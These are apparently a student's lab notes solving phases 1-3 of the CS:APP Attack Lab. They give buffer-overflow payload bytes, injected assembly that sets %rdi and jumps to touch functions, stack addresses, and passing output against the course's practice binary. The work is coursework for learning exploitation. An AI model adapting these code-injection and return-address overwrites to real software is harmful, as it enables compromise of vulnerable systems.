# Draft for attack lab

## How to submit? 
``` shell
./hex2raw < ans_i.txt > pi.txt
./ctarget -i pi.txt -q 
```
## Rules 
Everything written in as bytes are from lower address to higher. (one byte by one byte)
The program takes in command -> point to next cmd in bigger address (going upwards in virtual stack. )


## Phase 1
Ans: write ret address by reserved buffer zone:


1. check where is touch1 file -> 0x4017c0
``` shell 
disas touch1 
```

2. create a hex file. 
```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
c0 17 40 00 00 00 00 00 
```
that is -- putting 0x4017c0 in stack address so that the getbuf will jump back towards touch1. 

3. turn hexfile into 2 binary file. 
```shell 
./hex2raw ans_1.txt > p1.txt
./ctarget -i p1.txt -q 
```

4. And it passed. 
``` shell 
root@Flappy:~/csapp/target1# ./run.sh 
./run.sh: line 2: ans_1txt: No such file or directory
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00  
```

## Phase 2
This phase requires you to send a new argument to new function (touch2). 
The whole process: 
1. test
2. getbuf(): puts code in %rsp location | and puts %rip -> %rsp 
3. finish getbuf -> jump to set argument code (which is at %rsp) 
4. jump to touch2

**How to make it?** 
1. write code file and turn it into binary 
code.s ->
```shell    
movq <cookie value>, %rdi # set first arg
pushq <address of touch2>
retq

# then binary 
gcc -c code.s 
objdump -d code.o > code.d 
```

2. write into buffer zone
```shell 
<write into the code binary> 
multiple zeros (after 40 bytes)
<address of %rsp> (get from debugging tools -> address of %rsp) 
```

3. passed :
``` shell 
root@Flappy:~/csapp/target1# ./run.sh 
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
```


## Phase 3 
This phase requires sending cookie to touch func as well but call another function to make it pass:
```c 
void touch3(char *sval)
{
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}

/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}
```
Pass requirement:
1. Make byte representation of "cookie" into address of test, since getbuf may be modified when hexmatch's random function is called and covered the string. 
2. redirected the code just as we did in phase 2.

**How do we do it.**:
1. find correspondence: cookie = 0x59b997fa = 35 39 62 39 39 37 66 61 
2. write argument code:
``` asm
movq $0x5561dca8, %rdi // adddress of stored cookies -> "0x59b997fa"
pushq <touch3 address>
retq 
```
3. write injection code .
```txt
48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 // These bytes may be modfied by hexmatch. 
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

4. passed. 